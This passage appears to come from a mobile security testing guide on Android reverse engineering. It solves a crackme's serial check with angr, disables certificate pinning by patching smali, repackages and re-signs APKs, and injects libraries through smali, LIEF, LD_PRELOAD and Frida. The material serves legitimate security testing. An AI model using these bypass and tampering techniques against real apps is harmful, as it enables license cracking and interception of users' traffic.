│      ╎│   0x000017a8      sub r0, fp, 0xc
│      ╎│   0x000017ac      add r1, r0, r1
│      ╎│   0x000017b0      add r3, r1, r3
│      ╎│   0x000017b4      strb r2, [r3]
│      ╎│   0x000017b8      ldr r3, [var_10h]                          ; str.
│      ╎│                                                              ; 0x10 ; entry.preinit0
│      ╎│   0x000017bc      add r3, r3, 2                              ; "ELF\x01\x01\x01" ; aav.0x00000001
│      ╎│   0x000017c0      str r3, [var_10h]                          ; str.
│      ╎│                                                              ; 0x10
│      ╎│   0x000017c4      ldr r3, [var_14h]                          ; 0x14 ; entry.preinit0
│      ╎│   0x000017c8      add r3, r3, 1
│      ╎│   0x000017cc      str r3, [var_14h]                          ; 0x14
│      ╎│   ; CODE XREF from fcn.00001760 (0x1780)
│      ╎╰─> 0x000017d0      ldr r3, [var_14h]                          ; 0x14 ; entry.preinit0
│      ╎    0x000017d4      cmp r3, 4                                  ; aav.0x00000004 ; aav.0x00000001 ; aav.0x00000001
│      ╰──< 0x000017d8      ble 0x1784                                 ; likely
│           0x000017dc      ldrb r4, [fp, -0x1c]                       ; "4"
│           0x000017e0      bl fcn.000016f0
│           0x000017e4      mov r3, r0
│           0x000017e8      cmp r4, r3
│       ╭─< 0x000017ec      bne 0x1854                                 ; likely
│       │   0x000017f0      ldrb r4, [fp, -0x1b]
│       │   0x000017f4      bl fcn.0000170c
│       │   0x000017f8      mov r3, r0
│       │   0x000017fc      cmp r4, r3
│      ╭──< 0x00001800      bne 0x1854                                 ; likely
│      ││   0x00001804      ldrb r4, [fp, -0x1a]
│      ││   0x00001808      bl fcn.000016f0
│      ││   0x0000180c      mov r3, r0
│      ││   0x00001810      cmp r4, r3
│     ╭───< 0x00001814      bne 0x1854                                 ; likely
│     │││   0x00001818      ldrb r4, [fp, -0x19]
│     │││   0x0000181c      bl fcn.00001728
│     │││   0x00001820      mov r3, r0
│     │││   0x00001824      cmp r4, r3
│    ╭────< 0x00001828      bne 0x1854                                 ; likely
│    ││││   0x0000182c      ldrb r4, [fp, -0x18]
│    ││││   0x00001830      bl fcn.00001744
│    ││││   0x00001834      mov r3, r0
│    ││││   0x00001838      cmp r4, r3
│   ╭─────< 0x0000183c      bne 0x1854                                 ; likely
│   │││││   0x00001840      ldr r3, [0x0000186c]                       ; [0x186c:4]=0x270 section..hash ; section..hash
│   │││││   0x00001844      add r3, pc, r3                             ; 0x1abc ; "Product activation passed. Congratulations!"
│   │││││   0x00001848      mov r0, r3                                 ; 0x1abc ; "Product activation passed. Congratulations!" ;
│   │││││   0x0000184c      bl sym.imp.puts                            ; int puts(const char *s)
│   │││││                                                              ; int puts("Product activation passed. Congratulations!")
│  ╭──────< 0x00001850      b 0x1864
│  ││││││   ; CODE XREFS from fcn.00001760 (0x17ec, 0x1800, 0x1814, 0x1828, 0x183c)
│  │╰╰╰╰╰─> 0x00001854      ldr r3, aav.0x00000288                     ; [0x1870:4]=0x288 aav.0x00000288
│  │        0x00001858      add r3, pc, r3                             ; 0x1ae8 ; "Incorrect serial." ;
│  │        0x0000185c      mov r0, r3                                 ; 0x1ae8 ; "Incorrect serial." ;
│  │        0x00001860      bl sym.imp.puts                            ; int puts(const char *s)
│  │                                                                   ; int puts("Incorrect serial.")
│  │        ; CODE XREF from fcn.00001760 (0x1850)
│  ╰──────> 0x00001864      sub sp, fp, 8
╰           0x00001868      pop {r4, fp, pc}                           ; entry.preinit0 ; entry.preinit0 ;
\end{verbatim}

Discussing all the instructions in the function is beyond the scope of
this chapter, instead we will discuss only the important points needed
for the analysis. In the validation function, there is a loop present at
\texttt{0x00001784} which performs a XOR operation at offset
\texttt{0x00001798}. The loop is more clearly visible in the graph view
below.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/196e63531f9e462f1ab15205845fe2749b783d26.png}
\caption{Images/Chapters/0x05c/loop\_1784.png}
\end{figure}

XOR is a very commonly used technique to \emph{encrypt} information
where obfuscation is the goal rather than security. \textbf{XOR should
not be used for any serious encryption}, as it can be cracked using
frequency analysis. Therefore, the mere presence of XOR encryption in
such a validation logic always requires special attention and analysis.

Moving forward, at offset \texttt{0x000017dc}, the XOR decoded value
obtained from above is being compared against the return value from a
sub-function call at \texttt{0x000017e8}.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/444928658f8dea94b4ec067294cc7379daec0908.png}
\caption{Images/Chapters/0x05c/values\_compare\_17dc.png}
\end{figure}

Clearly this function is not complex, and can be analyzed manually, but
still remains a cumbersome task. Especially while working on a big code
base, time can be a major constraint, and it is desirable to automate
such analysis. Dynamic symbolic execution is helpful in exactly those
situations. In the above crackme, the symbolic execution engine can
determine the constraints on each byte of the input string by mapping a
path between the first instruction of the license check (at
\texttt{0x00001760}) and the code that prints the ``Product activation
passed'' message (at \texttt{0x00001840}).

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/ece45f74f3b110d8097107d86ef4cda57625332a.png}
\caption{Images/Chapters/0x05c/graph\_ifelse\_1760.png}
\end{figure}

The constraints obtained from the above steps are passed to a solver
engine, which finds an input that satisfies them - a valid license key.

You need to perform several steps to initialize Angr's symbolic
execution engine:

\begin{itemize}
\item
  Load the binary into a \texttt{Project}, which is the starting point
  for any kind of analysis in Angr.
\item
  Pass the address from which the analysis should start. In this case,
  we will initialize the state with the first instruction of the serial
  validation function. This makes the problem significantly easier to
  solve because you avoid symbolically executing the Base32
  implementation.
\item
  Pass the address of the code block that the analysis should reach. In
  this case, that's the offset \texttt{0x00001840}, where the code
  responsible for printing the ``Product activation passed'' message is
  located.
\item
  Also, specify the addresses that the analysis should not reach. In
  this case, the code block that prints the ``Incorrect serial'' message
  at \texttt{0x00001854} is not interesting.
\end{itemize}

\begin{quote}
Note that the Angr loader will load the PIE executable with a base
address of \texttt{0x400000}, which needs to be added to the offsets
from Cutter before passing it to Angr.
\end{quote}

The final solution script is presented below:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ angr}
\ImportTok{import}\NormalTok{ claripy}
\ImportTok{import}\NormalTok{ base64}

\NormalTok{load\_options }\OperatorTok{=}\NormalTok{ \{\}}

\NormalTok{b }\OperatorTok{=}\NormalTok{ angr.Project(}\StringTok{"./validate"}\NormalTok{, load\_options }\OperatorTok{=}\NormalTok{ load\_options)}

\CommentTok{\# The key validation function starts at 0x401760, so that\textquotesingle{}s where we create the initial state.}
\CommentTok{\# This speeds things up a lot because we\textquotesingle{}re bypassing the Base32{-}encoder.}

\NormalTok{state }\OperatorTok{=}\NormalTok{ b.factory.blank\_state(addr}\OperatorTok{=}\BaseNTok{0x401760}\NormalTok{)}

\NormalTok{simgr }\OperatorTok{=}\NormalTok{ b.factory.simulation\_manager(state)}
\NormalTok{simgr.explore(find}\OperatorTok{=}\BaseNTok{0x401840}\NormalTok{, avoid}\OperatorTok{=}\BaseNTok{0x401854}\NormalTok{)}

\CommentTok{\# 0x401840 = Product activation passed}
\CommentTok{\# 0x401854 = Incorrect serial}
\NormalTok{found }\OperatorTok{=}\NormalTok{ simgr.found[}\DecValTok{0}\NormalTok{]}

\CommentTok{\# Get the solution string from *(R11 {-} 0x20).}

\NormalTok{addr }\OperatorTok{=}\NormalTok{ found.memory.load(found.regs.r11 }\OperatorTok{{-}} \BaseNTok{0x20}\NormalTok{, endness}\OperatorTok{=}\StringTok{\textquotesingle{}Iend\_LE\textquotesingle{}}\NormalTok{)}
\NormalTok{concrete\_addr }\OperatorTok{=}\NormalTok{ found.solver.}\BuiltInTok{eval}\NormalTok{(addr)}
\NormalTok{solution }\OperatorTok{=}\NormalTok{ found.solver.}\BuiltInTok{eval}\NormalTok{(found.memory.load(concrete\_addr,}\DecValTok{10}\NormalTok{), cast\_to}\OperatorTok{=}\BuiltInTok{bytes}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(base64.b32encode(solution))}
\end{Highlighting}
\end{Shaded}

As discussed previously in the section
``\href{0x04c-Tampering-and-Reverse-Engineering.md\#static-and-dynamic-binary-analysis}{Dynamic
Binary Instrumentation}'', the symbolic execution engine constructs a
binary tree of the operations for the program input given and generates
a mathematical equation for each possible path that might be taken.
Internally, Angr explores all the paths between the two points specified
by us, and passes the corresponding mathematical equations to the solver
to return meaningful concrete results. We can access these solutions via
\texttt{simulation\_manager.found} list, which contains all the possible
paths explored by Angr which satisfies our specified search criteria.

Take a closer look at the latter part of the script where the final
solution string is being retrieved. The address of the string is
obtained from address \texttt{r11\ -\ 0x20}. This may appear magical at
first, but a careful analysis of the function at \texttt{0x00001760}
holds the clue, as it determines if the given input string is a valid
license key or not. In the disassembly above, you can see how the input
string to the function (in register R0) is stored into a local stack
variable \texttt{0x0000176c\ \ \ \ \ \ str\ r0,\ {[}var\_20h{]}}. Hence,
we decided to use this value to retrieve the final solution in the
script. Using \texttt{found.solver.eval} you can ask the solver
questions like ``given the output of this sequence of operations (the
current state in \texttt{found}), what must the input (at \texttt{addr})
have been?'').

\begin{quote}
In ARMv7, R11 is called fp (\emph{function pointer}), therefore
\texttt{R11\ -\ 0x20} is equivalent to \texttt{fp-0x20}:
\texttt{var\ int32\_t\ var\_20h\ @\ fp-0x20}
\end{quote}

Next, the \texttt{endness} parameter in the script specifies that the
data is stored in ``little-endian'' fashion, which is the case for
almost all of the Android devices.

Also, it may appear as if the script is simply reading the solution
string from the memory of the script. However, it's reading it from the
symbolic memory. Neither the string nor the pointer to the string
actually exist. The solver ensures that the solution it provides is the
same as if the program would be executed to that point.

Running this script should return the following output:

\begin{verbatim}
(angr) $ python solve.py
WARNING | cle.loader | The main binary is a position-independent executable.
It is being loaded with a base address of 0x400000.

b'ABGAATYAJQAFUABB'
\end{verbatim}

\begin{quote}
You may obtain different solutions using the script, as there are
multiple valid license keys possible.
\end{quote}

To conclude, learning symbolic execution might look a bit intimidating
at first, as it requires deep understanding and extensive practice.
However, the effort is justified considering the valuable time it can
save in contrast to analyzing complex disassembled instructions
manually. Typically you'd use hybrid techniques, as in the above
example, where we performed manual analysis of the disassembled code to
provide the correct criteria to the symbolic execution engine. Please to
the iOS chapter for more examples on Angr usage.

\hypertarget{tampering-and-runtime-instrumentation}{%
\subsubsection{Tampering and Runtime
Instrumentation}\label{tampering-and-runtime-instrumentation}}

First, we'll look at some simple ways to modify and instrument mobile
apps. \emph{Tampering} means making patches or runtime changes to the
app to affect its behavior. For example, you may want to deactivate SSL
pinning or binary protections that hinder the testing process.
\emph{Runtime Instrumentation} encompasses adding hooks and runtime
patches to observe the app's behavior. In mobile application security
however, the term loosely refers to all kinds of runtime manipulation,
including overriding methods to change behavior.

\hypertarget{patching-repackaging-and-re-signing}{%
\paragraph{Patching, Repackaging, and
Re-Signing}\label{patching-repackaging-and-re-signing}}

Making small changes to the Android Manifest or bytecode is often the
quickest way to fix small annoyances that prevent you from testing or
reverse engineering an app. On Android, two issues in particular happen
regularly:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  You can't intercept HTTPS traffic with a proxy because the app employs
  SSL pinning.
\item
  You can't attach a debugger to the app because the
  \texttt{android:debuggable} flag is not set to \texttt{"true"} in the
  Android Manifest.
\end{enumerate}

In most cases, both issues can be fixed by making minor changes to the
app (aka. patching) and then re-signing and repackaging it. Apps that
run additional integrity checks beyond default Android code-signing are
an exception. In those cases, you have to patch the additional checks as
well.

The first step is unpacking and disassembling the APK with
\texttt{apktool}:

\begin{verbatim}
$ apktool d target_apk.apk
\end{verbatim}

\begin{quote}
Note: To save time, you may use the flag \texttt{-\/-no-src} if you only
want to unpack the APK but not disassemble the code. For example, when
you only want to modify the Android Manifest and repack immediately.
\end{quote}

\hypertarget{patching-example-disabling-certificate-pinning}{%
\subparagraph{Patching Example: Disabling Certificate
Pinning}\label{patching-example-disabling-certificate-pinning}}

Certificate pinning is an issue for security testers who want to
intercept HTTPS communication for legitimate reasons. Patching bytecode
to deactivate SSL pinning can help with this. To demonstrate bypassing
certificate pinning, we'll walk through an implementation in an example
application.

Once you've unpacked and disassembled the APK, it's time to find the
certificate pinning checks in the Smali source code. Searching the code
for keywords such as ``X509TrustManager'' should point you in the right
direction.

In our example, a search for ``X509TrustManager'' returns one class that
implements a custom TrustManager. The derived class implements the
methods \texttt{checkClientTrusted}, \texttt{checkServerTrusted}, and
\texttt{getAcceptedIssuers}.

To bypass the pinning check, add the \texttt{return-void} opcode to the
first line of each method. This opcode causes the checks to return
immediately. With this modification, no certificate checks are
performed, and the application accepts all certificates.

\begin{verbatim}
.method public checkServerTrusted([LJava/security/cert/X509Certificate;Ljava/lang/String;)V
  .locals 3
  .param p1, "chain"  # [Ljava/security/cert/X509Certificate;
  .param p2, "authType"   # Ljava/lang/String;

  .prologue
  return-void      # <-- OUR INSERTED OPCODE!
  .line 102
  iget-object v1, p0, Lasdf/t$a;->a:Ljava/util/ArrayList;

  invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

  move-result-object v1

  :goto_0
  invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z
\end{verbatim}

This modification will break the APK signature, so you'll also have to
re-sign the altered APK archive after repackaging it.

\hypertarget{patching-example-making-an-app-debuggable}{%
\subparagraph{Patching Example: Making an App
Debuggable}\label{patching-example-making-an-app-debuggable}}

Every debugger-enabled process runs an extra thread for handling JDWP
protocol packets. This thread is started only for apps that have the
\texttt{android:debuggable="true"} flag set in their manifest file's
\texttt{\textless{}application\textgreater{}} element. This is the
typical configuration of Android devices shipped to end users.

When reverse engineering apps, you'll often have access to the target
app's release build only. Release builds aren't meant to be
debugged---after all, that's the purpose of \emph{debug builds}. If the
system property \texttt{ro.debuggable} is set to ``0'', Android
disallows both JDWP and native debugging of release builds. Although
this is easy to bypass, you're still likely to encounter limitations,
such as a lack of line breakpoints. Nevertheless, even an imperfect
debugger is still an invaluable tool, being able to inspect the runtime
state of a program makes understanding the program \emph{a lot} easier.

To \emph{convert} a release build into a debuggable build, you need to
modify a flag in the Android Manifest file (AndroidManifest.xml). Once
you've unpacked the app
(e.g.~\texttt{apktool\ d\ -\/-no-src\ UnCrackable-Level1.apk}) and
decoded the Android Manifest, add \texttt{android:debuggable="true"} to
it using a text editor:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<application}\OtherTok{ android:allowBackup=}\StringTok{"true"}\OtherTok{ android:debuggable=}\StringTok{"true"}\OtherTok{ android:icon=}\StringTok{"@drawable/ic\_launcher"}\OtherTok{ android:label=}\StringTok{"@string/app\_name"}\OtherTok{ android:name=}\StringTok{"com.xxx.xxx.xxx"}\OtherTok{ android:theme=}\StringTok{"@style/AppTheme"}\KeywordTok{>}
\end{Highlighting}
\end{Shaded}

Even if we haven't altered the source code, this modification also
breaks the APK signature, so you'll also have to re-sign the altered APK
archive.

\hypertarget{repackaging}{%
\subparagraph{Repackaging}\label{repackaging}}

You can easily repackage an app by doing the following:

\begin{verbatim}
$ cd UnCrackable-Level1
$ apktool b
$ zipalign -v 4 dist/UnCrackable-Level1.apk ../UnCrackable-Repackaged.apk
\end{verbatim}

Note that the Android Studio build tools directory must be in the path.
It is located at \texttt{{[}SDK-Path{]}/build-tools/{[}version{]}}. The
\texttt{zipalign} and \texttt{apksigner} tools are in this directory.

\hypertarget{re-signing}{%
\subparagraph{Re-Signing}\label{re-signing}}

Before re-signing, you first need a code-signing certificate. If you
have built a project in Android Studio before, the IDE has already
created a debug keystore and certificate in
\texttt{\$HOME/.android/debug.keystore}. The default password for this
KeyStore is ``android'' and the key is called ``androiddebugkey''.

The standard Java distribution includes \texttt{keytool} for managing
KeyStores and certificates. You can create your own signing certificate
and key, then add it to the debug KeyStore:

\begin{verbatim}
$ keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000
\end{verbatim}

After the certificate is available, you can re-sign the APK with it. Be
sure that \texttt{apksigner} is in the path and that you run it from the
folder where your repackaged APK is located.

\begin{verbatim}
$ apksigner sign --ks  ~/.android/debug.keystore --ks-key-alias signkey UnCrackable-Repackaged.apk
\end{verbatim}

Note: If you experience JRE compatibility issues with
\texttt{apksigner}, you can use \texttt{jarsigner} instead. When you do
this, \texttt{zipalign} must be called \textbf{after} signing.

\begin{verbatim}
$ jarsigner -verbose -keystore ~/.android/debug.keystore ../UnCrackable-Repackaged.apk signkey
$ zipalign -v 4 dist/UnCrackable-Level1.apk ../UnCrackable-Repackaged.apk
\end{verbatim}

Now you may reinstall the app:

\begin{verbatim}
$ adb install UnCrackable-Repackaged.apk
\end{verbatim}

\hypertarget{the-wait-for-debugger-feature}{%
\subparagraph{The ``Wait For Debugger''
Feature}\label{the-wait-for-debugger-feature}}

The UnCrackable App is not stupid: it notices that it has been run in
debuggable mode and reacts by shutting down. A modal dialog is shown
immediately, and the crackme terminates once you tap ``OK''.

Fortunately, Android's ``Developer options'' contain the useful ``Wait
for Debugger'' feature, which allows you to automatically suspend an app
doing startup until a JDWP debugger connects. With this feature, you can
connect the debugger before the detection mechanism runs, and trace,
debug, and deactivate that mechanism. It's really an unfair advantage,
but, on the other hand, reverse engineers never play fair!

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/d4138675f1560de187de0888b5d85fc997c30b87.png}
\caption{Debugger Detection}
\end{figure}

In the Developer options, pick \texttt{Uncrackable1} as the debugging
application and activate the ``Wait for Debugger'' switch.

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/5dca12a550e25ea0d8869ad28a3f1018e7b054bd.png}
\caption{Developer Options}
\end{figure}

Note: Even with \texttt{ro.debuggable} set to ``1'' in
\texttt{default.prop}, an app won't show up in the ``debug app'' list
unless the \texttt{android:debuggable} flag is set to \texttt{"true"} in
the Android Manifest.

\hypertarget{patching-react-native-applications}{%
\subparagraph{Patching React Native
applications}\label{patching-react-native-applications}}

If the \href{https://facebook.github.io/react-native}{React Native}
framework has been used for developing then the main application code is
located in the file \texttt{assets/index.android.bundle}. This file
contains the JavaScript code. Most of the time, the JavaScript code in
this file is minified. By using the tool
\href{https://mindedsecurity.github.io/jstillery}{JStillery} a human
readable version of the file can be retried, allowing code analysis. The
\href{https://github.com/mindedsecurity/jstillery/}{CLI version of
JStillery} or the local server should be preferred instead of using the
online version as otherwise source code is sent and disclosed to a 3rd
party.

The following approach can be used in order to patch the JavaScript
file:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Unpack the APK archive using \texttt{apktool} tool.
\item
  Copy the content of the file \texttt{assets/index.android.bundle} into
  a temporary file.
\item
  Use \texttt{JStillery} to beautify and deobfuscate the content of the
  temporary file.
\item
  Identify where the code should be patched in the temporary file and
  implement the changes.
\item
  Put the \emph{patched code} on a single line and copy it in the
  original \texttt{assets/index.android.bundle} file.
\item
  Repack the APK archive using \texttt{apktool} tool and sign it before
  to install it on the target device/emulator.
\end{enumerate}

\hypertarget{library-injection}{%
\subparagraph{Library Injection}\label{library-injection}}

In the previous section we learned about patching application code to
assist in our analysis, but this approach has several limitations. For
instance, you'd like to log everything that's being sent over the
network without having to perform a MITM attack. For this you'd have to
patch all possible calls to the network APIs, which can quickly become
impracticable when dealing with large applications. In addition, the
fact that patching is unique to each application can be also considered
a shortcoming, as this code cannot be easily reused.

Using library injection you can develop reusable libraries and inject
them to different applications, effectively making them behave
differently without having to modify their original source code. This is
known as DLL injection on Windows (broadly used to modify and bypass
anti-cheat mechanisms in games), \texttt{LD\_PRELOAD} on Linux and
\texttt{DYLD\_INSERT\_LIBRARIES} on macOS. On Android and iOS, a common
example is using the Frida Gadget whenever Frida's so-called
\href{https://frida.re/docs/modes/\#injected}{Injected mode} of
operation isn't suitable (i.e.~you cannot run the Frida server on the
target device). In this situation, you can
\href{https://frida.re/docs/gadget/}{inject the Gadget} library by using
the same methods you're going to learn in this section.

Library injection is desirable in many situations such as:

\begin{itemize}
\tightlist
\item
  Performing process introspection (e.g.~listing classes, tracing method
  calls, monitoring accessed files, monitoring network access, obtaining
  direct memory access).
\item
  Supporting or replacing existing code with your own implementations
  (e.g.~replace a function that should give random numbers).
\item
  Introducing new features to an existing application.
\item
  Debugging and fixing elusive runtime bugs on code for which you don't
  have the original source.
\item
  Enable dynamic testing on a non-rooted device (e.g.~with Frida).
\end{itemize}

In this section, we will learn about techniques for performing library
injection on Android, which basically consist of patching the
application code (smali or native) or alternatively using the
\texttt{LD\_PRELOAD} feature provided by the OS loader itself.

Patching the Application's Smali Code

An Android application's decompiled smali code can be patched to
introduce a call to \texttt{System.loadLibrary}. The following smali
patch injects a library named \emph{libinject.so}:

\begin{verbatim}
const-string v0, "inject"
invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
\end{verbatim}

Ideally you should insert the above code early in the
\href{https://developer.android.com/guide/components/activities/activity-lifecycle}{application
lifecycle}, for instance in the \texttt{onCreate} method. It is
important to remember to add the library libinject.so in the respective
architecture folder (armeabi-v7a, arm64-v8a, x86) of the \texttt{lib}
folder in the APK. Finally, you need to re-sign the application before
using it.

A well-known use case of this technique is loading the Frida gadget to
an application, specially while working on a non-rooted device (this is
what
\href{https://github.com/sensepost/objection/wiki/Patching-Android-Applications}{\texttt{objection\ patchapk}}
basically does).

Patching Application's Native Library

Many Android applications use native code in addition to Java code for
various performance and security reasons. The native code is present in
the form of ELF shared libraries. An ELF executable includes a list of
shared libraries (dependencies) that are linked to the executable for it
to function optimally. This list can be modified to insert an additional
library to be injected into the process.

Modifying the ELF file structure manually to inject a library can be
cumbersome and prone to errors. However, this task can be performed with
relative ease using \href{https://lief.quarkslab.com/}{LIEF} (Library to
Instrument Executable Formats). Using it requires only a few lines of
Python code as shown below:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ lief}

\NormalTok{libnative }\OperatorTok{=}\NormalTok{ lief.parse(}\StringTok{"libnative.so"}\NormalTok{)}
\NormalTok{libnative.add\_library(}\StringTok{"libinject.so"}\NormalTok{) }\CommentTok{\# Injection!}
\NormalTok{libnative.write(}\StringTok{"libnative.so"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In the above example, libinject.so library is injected as a dependency
of a native library (libnative.so), which the application already loads
by default. Frida gadget can be injected into an application using this
approach as explained in detail in
\href{https://lief.quarkslab.com/doc/latest/tutorials/09_frida_lief.html}{LIEF's
documentation}. As in the previous section, it is important to remember
adding the library to the respective architecture \texttt{lib} folder in
the APK and finally re-signing the application.

LD\_PRELOAD

Above we looked into techniques which require some kind of modification
of the application's code. A library can also be injected into a process
using functionalities offered by the loader of the operating system. On
Android, which is a Linux based OS, you can load an additional library
by setting the \texttt{LD\_PRELOAD} environment variable.

As the \href{http://man7.org/linux/man-pages/man8/ld.so.8.html}{ld.so
man page} states, symbols loaded from the library passed using
\texttt{LD\_PRELOAD} always get precedence, i.e.~they are searched first
by the loader while resolving the symbols, effectively overriding the
original ones. This feature is often used to inspect the input
parameters of some commonly used libc functions such as \texttt{fopen},
\texttt{read}, \texttt{write}, \texttt{strcmp}, etc., specially in
obfuscated programs, where understanding their behavior may be
challenging. Therefore, having an insight on which files are being
opened or which strings are being compared may be very valuable. The key
idea here is ``function wrapping'', meaning that you cannot patch system
calls such as libc's \texttt{fopen}, but you can override (wrap) it
including custom code that will, for instance, print the input
parameters for you and still call the original \texttt{fopen} remaining
transparent to the caller.

On Android, setting \texttt{LD\_PRELOAD} is slightly different compared
to other Linux distributions. If you recall from the
``\href{0x05a-Platform-Overview.md\#zygote}{Platform Overview}''
section, every application in Android is forked from Zygote, which is
started very early during the Android boot-up. Thus, setting
\texttt{LD\_PRELOAD} on Zygote is not possible. As a workaround for this
problem, Android supports the \texttt{setprop} (set property)
functionality. Below you can see an example for an application with
package name \texttt{com.foo.bar} (note the additional \texttt{wrap.}
prefix):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{setprop}\NormalTok{ wrap.com.foo.bar LD\_PRELOAD=/data/local/tmp/libpreload.so}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Please note that if the library to be preloaded does not have SELinux
context assigned, from Android 5.0 (API level 21) onwards, you need to
disable SELinux to make \texttt{LD\_PRELOAD} work, which may require
root.
\end{quote}

\hypertarget{dynamic-instrumentation}{%
\paragraph{Dynamic Instrumentation}\label{dynamic-instrumentation}}

\hypertarget{information-gathering-1}{%
\subparagraph{Information Gathering}\label{information-gathering-1}}

In this section we will learn about how to use Frida to obtain
information about a running application.

Getting Loaded Classes and their Methods

You can use the command \texttt{Java} in the Frida CLI to access the
Java runtime and retrieve information from the running app. Remember
that, unlike Frida for iOS, in Android you need to wrap your code inside
a \texttt{Java.perform} function. Thus, it's more convenient to use
Frida scripts to e.g.~get a list of loaded Java classes and their
corresponding methods and fields or for more complex information
gathering or instrumentation. One such scripts is listed below. The
script to list class's methods used below is available on
\href{https://github.com/frida/frida-java-bridge/issues/44}{Github}.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// Get list of loaded Java classes and methods}

\CommentTok{// Filename: java\_class\_listing.js}

\NormalTok{Java.}\FunctionTok{perform}\NormalTok{(}\FunctionTok{function}\NormalTok{() \{}
\NormalTok{    Java.}\FunctionTok{enumerateLoadedClasses}\NormalTok{(\{}
\NormalTok{        onMatch: }\FunctionTok{function}\NormalTok{(className) \{}
\NormalTok{            console.}\FunctionTok{log}\NormalTok{(className);}
            \FunctionTok{describeJavaClass}\NormalTok{(className);}
\NormalTok{        \},}
\NormalTok{        onComplete: }\FunctionTok{function}\NormalTok{() \{\}}
\NormalTok{    \});}
\NormalTok{\});}

\CommentTok{// Get the methods and fields}
\NormalTok{function }\FunctionTok{describeJavaClass}\NormalTok{(className) \{}
\NormalTok{  var jClass = Java.}\FunctionTok{use}\NormalTok{(className);}
\NormalTok{  console.}\FunctionTok{log}\NormalTok{(JSON.}\FunctionTok{stringify}\NormalTok{(\{}
\NormalTok{    \_name: className,}
\NormalTok{    \_methods: }\BuiltInTok{Object}\NormalTok{.}\FunctionTok{getOwnPropertyNames}\NormalTok{(jClass.\_\_proto\_\_).}\FunctionTok{filter}\NormalTok{(}\FunctionTok{function}\NormalTok{(m) \{}
      \KeywordTok{return}\NormalTok{ !m.}\FunctionTok{startsWith}\NormalTok{(}\CharTok{\textquotesingle{}$\textquotesingle{}}\NormalTok{) }\CommentTok{// filter out Frida related special properties}
\NormalTok{        || m == \textquotesingle{}class\textquotesingle{} || m == \textquotesingle{}constructor\textquotesingle{} }\CommentTok{// optional}
\NormalTok{    \}),}
\NormalTok{    \_fields: jClass.}\FunctionTok{class}\NormalTok{.}\FunctionTok{getFields}\NormalTok{().}\FunctionTok{map}\NormalTok{(}\FunctionTok{function}\NormalTok{(f) \{}
      \KeywordTok{return}\NormalTok{( f.}\FunctionTok{toString}\NormalTok{());}
\NormalTok{    \})}
\NormalTok{  \}, }\KeywordTok{null}\NormalTok{, }\DecValTok{2}\NormalTok{));}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

After saving the script to a file called java\_class\_listing.js, you
can tell Frida CLI to load it by using the flag \texttt{-l} and inject
it to the process ID specified by \texttt{-p}.

\begin{verbatim}
frida -U -l java_class_listing.js -p <pid>

// Output
[Huawei Nexus 6P::sg.vantagepoint.helloworldjni]->
...

com.scottyab.rootbeer.sample.MainActivity
{
  "_name": "com.scottyab.rootbeer.sample.MainActivity",
  "_methods": [
  ...
    "beerView",
    "checkRootImageViewList",
    "floatingActionButton",
    "infoDialog",
    "isRootedText",
    "isRootedTextDisclaimer",
    "mActivity",
    "GITHUB_LINK"
  ],
  "_fields": [
    "public static final int android.app.Activity.DEFAULT_KEYS_DIALER",
...
\end{verbatim}

Given the verbosity of the output, the system classes can be filtered
out programmatically to make output more readable and relevant to the
use case.

Getting Loaded Libraries

You can retrieve process related information straight from the Frida CLI
by using the \texttt{Process} command. Within the \texttt{Process}
command the function \texttt{enumerateModules} lists the libraries
loaded into the process memory.

\begin{verbatim}
[Huawei Nexus 6P::sg.vantagepoint.helloworldjni]-> Process.enumerateModules()
[
    {
        "base": "0x558a442000",
        "name": "app_process64",
        "path": "/system/bin/app_process64",
        "size": 32768
    },
    {
        "base": "0x78bc984000",
        "name": "libandroid_runtime.so",
        "path": "/system/lib64/libandroid_runtime.so",
        "size": 2011136
    },
...
\end{verbatim}

\hypertarget{method-hooking}{%
\subparagraph{Method Hooking}\label{method-hooking}}

Xposed

Let's assume you're testing an app that's stubbornly quitting on your
rooted device. You decompile the app and find the following highly
suspect method:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{package}\NormalTok{ com.example.a.b}

\KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{c}\NormalTok{() \{}
  \DataTypeTok{int}\NormalTok{ v3 = }\DecValTok{0}\NormalTok{;}
  \DataTypeTok{boolean}\NormalTok{ v0 = }\KeywordTok{false}\NormalTok{;}

  \BuiltInTok{String}\NormalTok{[] v1 = }\KeywordTok{new} \BuiltInTok{String}\NormalTok{[]\{}\StringTok{"/sbin/"}\NormalTok{, }\StringTok{"/system/bin/"}\NormalTok{, }\StringTok{"/system/xbin/"}\NormalTok{, }\StringTok{"/data/local/xbin/"}\NormalTok{,}
    \StringTok{"/data/local/bin/"}\NormalTok{, }\StringTok{"/system/sd/xbin/"}\NormalTok{, }\StringTok{"/system/bin/failsafe/"}\NormalTok{, }\StringTok{"/data/local/"}\NormalTok{\};}

    \DataTypeTok{int}\NormalTok{ v2 = v1.}\FunctionTok{length}\NormalTok{;}

